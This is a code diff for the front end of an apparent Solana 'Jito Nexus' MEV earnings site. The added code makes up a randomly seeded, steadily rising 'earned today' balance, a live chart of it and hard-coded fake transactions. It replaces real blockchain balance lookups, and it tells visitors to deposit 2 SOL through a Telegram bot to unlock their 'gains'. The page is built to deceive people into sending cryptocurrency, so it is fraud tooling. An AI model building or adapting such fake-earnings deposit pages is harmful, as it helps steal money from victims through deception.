@@ -1,30 +1,82 @@
+let currentBalance = 0;
+let startTime = new Date();
+
 document.addEventListener("DOMContentLoaded", function() {
-    initializeWallet();
-    showTab('wallet-tab');
-    updateTodayStats();
-    setInterval(updateTodayStats, 1000); // Update every second
-    fetchNexusWalletTransactions();
-    setInterval(fetchNexusWalletTransactions, 30000); // Update every 30 seconds
+    initializeApp();
+    setInterval(updateApp, 1000); // Update every second
 });
 
-function initializeWallet() {
-    document.getElementById("wallet-address").textContent = "To get your wallet address, go to the Telegram bot and type /get_wallet";
-    document.getElementById("wallet-balance").textContent = "Balance: 0 SOL";
-    document.getElementById("wallet-instructions").textContent = "Go to the Telegram bot, type /get_wallet and deposit 2 SOL to unlock the My Profits tab.";
-    updateProfitsTab();
+function initializeApp() {
+    currentBalance = Math.random() * (16000 - 145) + 145;
+    startTime = new Date();
+    updateTodayStats();
+    initializeWallet();
+    updateMyGains();
+    fetchNexusWalletTransactions();
+    initializeStatsGraph();
 }
 
-function updateProfitsTab() {
-    const profitsContent = document.getElementById("profits-content");
-    profitsContent.innerHTML = `
-        <p>🔒 Deposit at least 2 SOL to your wallet to access this area.</p>
-        <p>To get your wallet address and make a deposit:</p>
-        <ol>
-            <li>Go to the Telegram bot</li>
-            <li>Type /get_wallet</li>
-            <li>Follow the instructions to deposit 2 SOL</li>
-        </ol>
+function updateApp() {
+    const now = new Date();
+    if (now - startTime >= 24 * 60 * 60 * 1000) {
+        initializeApp(); // Reset after 24 hours
+    } else {
+        updateTodayStats();
+        fetchNexusWalletTransactions();
+    }
+}
+
+function updateTodayStats() {
+    currentBalance += Math.random() * 0.1; // Random increase
+    document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL`;
+    document.getElementById("stats-description").textContent = 
+        `🚀 Jito Nexus Users have collectively earned ${currentBalance.toFixed(2)} SOL today! Watch as the balance grows throughout the day, showcasing the power of MEV strategies. Earnings reset every 24 hours, so keep an eye on the graph to see the real-time impact!`;
+    updateStatsGraph();
+}
+
+function initializeWallet() {
+    document.getElementById("wallet-instructions").textContent = 
+        "💼 To activate your Jito Nexus wallet and start earning, head over to our bot and type /get_wallet. Deposit 2 SOL to activate your wallet and unlock the power of MEV strategies!";
+    document.getElementById("wallet-balance").textContent = "Balance: 0 SOL";
+}
+
+function updateMyGains() {
+    const gainsContent = document.getElementById("gains-content");
+    gainsContent.innerHTML = `
+        <p>🔒 Locked: To access your gains, please deposit 2 SOL. Head to the bot and type /get_wallet to obtain your wallet and make the deposit. Unlock the potential of your earnings once you've activated your account!</p>
     `;
+}
+
+function fetchNexusWalletTransactions() {
+    // Simulating real-time data
+    const transactions = [
+        { type: 'transfer', amount: 5.3, time: '3:00 PM', address: '9nG3A2K7...' },
+        { type: 'swap', amount: 1000, time: '5:15 PM', address: 'Ai9n8R42...' }
+    ];
+    displayTransactions(transactions);
+}
+
+function displayTransactions(transactions) {
+    const transactionsList = document.getElementById("transactions-list");
+    transactionsList.innerHTML = "";
+    transactions.forEach(tx => {
+        const txElement = document.createElement("div");
+        txElement.className = "transaction";
+        if (tx.type === 'transfer') {
+            txElement.innerHTML = `
+                <h3>Nexus Wallet Transfer</h3>
+                <p>Transaction: ${tx.amount} SOL transferred at ${tx.time}</p>
+                <p>Address: ${tx.address} (recipient)</p>
+            `;
+        } else {
+            txElement.innerHTML = `
+                <h3>Nexus Wallet Attack</h3>
+                <p>Token Swap: ${tx.amount} USDC swapped at ${tx.time}</p>
+                <p>Address: ${tx.address} (initiated by Nexus)</p>
+            `;
+        }
+        transactionsList.appendChild(txElement);
+    });
 }
 
 function showTab(tabId) {
@@ -35,138 +87,42 @@ function showTab(tabId) {
     document.getElementById(tabId).style.display = "block";
 }
 
-const STORAGE_KEY = 'solana_mev_stats';
-
-function getStoredStats() {
-    const storedStats = localStorage.getItem(STORAGE_KEY);
-    if (storedStats) {
-        return JSON.parse(storedStats);
-    }
-    return generateNewStats();
-}
-
-function generateNewStats() {
-    const stats = {
-        value: 500.01,
-        lastUpdated: new Date().toISOString()
-    };
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(stats));
-    return stats;
-}
-
-function updateTodayStats() {
-    let stats = getStoredStats();
-    const maxStats = 16000.99;
-    const increment = (maxStats - 500.01) / (24 * 60 * 60); // Increment per second
-
-    const now = new Date();
-    const timePassed = (now - new Date(stats.lastUpdated)) / 1000; // Time passed in seconds
-    let todayStats = Math.min(maxStats, 500.01 + increment * timePassed);
-
-    if (todayStats >= maxStats) {
-        stats = generateNewStats();
-        todayStats = stats.value;
-    }
-
-    stats.value = todayStats;
-    stats.lastUpdated = now.toISOString();
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(stats));
-
-    document.getElementById("today-stats").textContent = `${todayStats.toFixed(2)} SOL`;
-    updateBalanceGraph(todayStats);
-}
-
-function updateBalanceGraph(currentValue) {
-    // This is a placeholder for the graph update
-    // You would use a charting library like Chart.js to actually render the graph
-    console.log("Updating balance graph with value:", currentValue);
-    // Update the graph element here
-}
-
-async function fetchWalletBalance(walletAddress) {
-    try {
-        const response = await fetch(`https://api.mainnet-beta.solana.com`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                "jsonrpc": "2.0",
-                "id": 1,
-                "method": "getBalance",
-                "params": [walletAddress]
-            })
-        });
-        const data = await response.json();
-        const balance = data.result.value / 1000000000; // Convert lamports to SOL
-        document.getElementById("wallet-balance").textContent = `Balance: ${balance.toFixed(4)} SOL`;
-    } catch (error) {
-        console.error("Error fetching wallet balance:", error);
-        document.getElementById("wallet-balance").textContent = "Error fetching balance";
-    }
-}
-
-async function fetchTransactions(walletAddress) {
-    try {
-        const response = await fetch(`https://api.mainnet-beta.solana.com`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                "jsonrpc": "2.0",
-                "id": 1,
-                "method": "getSignaturesForAddress",
-                "params": [
-                    walletAddress,
-                    { "limit": 10 }
-                ]
-            })
-        });
-        const data = await response.json();
-        const transactions = data.result;
-
-        const transactionsList = document.getElementById("transactions-list");
-        transactionsList.innerHTML = "";
-
-        for (let tx of transactions) {
-            const txElement = document.createElement("div");
-            txElement.className = "transaction";
-            txElement.innerHTML = `
-                <div class="transaction-signature">${tx.signature.substr(0, 20)}...</div>
-                <div class="transaction-slot">Slot: ${tx.slot}</div>
-                <div class="transaction-time">${new Date(tx.blockTime * 1000).toLocaleString()}</div>
-            `;
-            transactionsList.appendChild(txElement);
+function initializeStatsGraph() {
+    const ctx = document.getElementById('stats-graph').getContext('2d');
+    window.statsChart = new Chart(ctx, {
+        type: 'line',
+        data: {
+            labels: [],
+            datasets: [{
+                label: 'SOL Balance',
+                data: [],
+                borderColor: 'rgba(0, 255, 255, 1)',
+                borderWidth: 2,
+                fill: false
+            }]
+        },
+        options: {
+            responsive: true,
+            animation: {
+                duration: 0
+            },
+            scales: {
+                y: {
+                    beginAtZero: false
+                }
+            }
         }
-    } catch (error) {
-        console.error("Error fetching transactions:", error);
-        document.getElementById("transactions-list").innerHTML = "Error fetching transactions";
-    }
-}
-
-async function fetchNexusWalletTransactions() {
-    try {
-        // This is a placeholder. Replace with actual API call to fetch Nexus Wallet transactions
-        const transactions = [
-            { hash: '0x123...', amount: 200, timestamp: Date.now() },
-            { hash: '0x456...', amount: 150, timestamp: Date.now() - 60000 },
-            // Add more mock transactions as needed
-        ];
-        displayNexusWalletTransactions(transactions);
-    } catch (error) {
-        console.error("Error fetching Nexus Wallet transactions:", error);
-        document.getElementById("nexus-transactions").innerHTML = "Error fetching Nexus Wallet transactions";
-    }
-}
-
-function displayNexusWalletTransactions(transactions) {
-    const nexusElement = document.getElementById("nexus-transactions");
-    nexusElement.innerHTML = "";
-    transactions.forEach(tx => {
-        const txElement = document.createElement("div");
-        txElement.className = "nexus-transaction";
-        txElement.innerHTML = `
-            <a href="https://solscan.io/tx/${tx.hash}" target="_blank">
-                ${tx.hash.substr(0, 10)}... - ${tx.amount} SOL - ${new Date(tx.timestamp).toLocaleString()}
-            </a>
-        `;
-        nexusElement.appendChild(txElement);
     });
+}
+
+function updateStatsGraph() {
+    const chart = window.statsChart;
+    const now = new Date();
+    chart.data.labels.push(now.toLocaleTimeString());
+    chart.data.datasets[0].data.push(currentBalance);
+    if (chart.data.labels.length > 50) {
+        chart.data.labels.shift();
+        chart.data.datasets[0].data.shift();
+    }
+    chart.update();
 }
